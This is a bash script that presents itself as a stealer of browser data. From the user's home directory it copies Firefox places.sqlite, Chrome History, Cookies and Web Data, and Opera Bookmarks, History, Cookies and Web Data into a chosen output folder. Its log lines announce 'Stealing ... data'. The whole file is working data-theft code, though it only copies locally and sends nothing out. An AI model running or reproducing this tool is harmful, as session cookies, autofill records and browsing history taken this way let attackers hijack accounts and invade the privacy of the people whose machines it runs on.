#!/bin/bash

### Mozilla Firefox - files to steal ###
firefoxPath="/home/"$USER"/.mozilla/firefox/"
firefoxProf=$firefoxPath"profiles.ini"
firefoxList=("places.sqlite")

### Google Chrome - files to steal ###
chromePath="/home/"$USER"/.config/google-chrome/Default/"
chromeList=("History" "Cookies" "Web Data")

### Opera - files to steal ###
operaPath="/home/"$USER"/.config/opera/"
operaList=("Bookmarks" "History" "Cookies" "Web Data")

DATE=$(date +"%Y-%m-%d")
verbose=false
output=$(pwd)

### Color definitions ###
d="\e[0m" # Default color + no bold
b="\e[1m" # Bold
y="\e[33m" # Yellow

while getopts ":vo:" opt; do
  case $opt in
    v)
      verbose=true
      ;;
    o)
      output=$OPTARG
      ;;
    *)
      echo "Usage: $0 [OPTION]..."
      echo ""
      echo "-v                   Enable verbose output"
      echo "-o {String}          Output path (e.g. /tmp/)"
      exit 1
      ;;
  esac
done

function log() {
  echo -e $y$(date +"[%Y-%m-%d %H:%M:%S]")$d $1
}

function main() {
  if [[ "${output:${#output}-1:1}" != "/" ]]; then
    output=$output/
  fi
  if [[ $verbose == true ]]; then
    log $b"Stealing Mozilla Firefox data..."$d
  fi
  firefox
  if [[ $verbose == true ]]; then
    log $b"Stealing Google Chrome data..."$d
  fi
  chrome
  if [[ $verbose == true ]]; then
    log $b"Stealing Opera data..."$d
  fi
  opera
}

function firefox() {
  firefoxProfileList=()
  while read line; do
    if [[ ${line:0:4} == "Path" ]]; then
      firefoxProfileList+=" ${line:5}"
    fi
  done < $firefoxProf

  for profile in "${firefoxProfileList[@]}"; do
    for filename in "${firefoxList[@]}"; do
      in=$(echo "$firefoxPath$profile/$filename" | tr -d " " )
      out=$(echo $output"firefox_"$DATE"_"$filename | tr " " "_")
      if [[ $verbose == true ]]; then
        log "Copy file from $in to $out"
      fi
      cp "$in" "$out"
    done
  done
}

function chrome() {
  for filename in "${chromeList[@]}"; do
    in=$chromePath$filename
    out=$(echo $output"chrome_"$filename"_"$DATE".sqlite" | tr " " "_")
    if [[ $verbose == true ]]; then
      log "Copy file from $in to $out"
    fi
    cp "$in" "$out"
  done
}

function opera() {
  for filename in "${operaList[@]}"; do
    in=$operaPath$filename
    if [[ $filename == "Bookmarks" ]]; then
      out=$output"opera_"$filename"_"$DATE".json"
    else
      out=$(echo $output"opera_"$filename"_"$DATE".sqlite" | tr " " "_")
    fi
    if [[ $verbose == true ]]; then
      log "Copy file from $in to $(echo $out | tr " " "_")"
    fi
    cp "$in" "$out"
  done
}

main
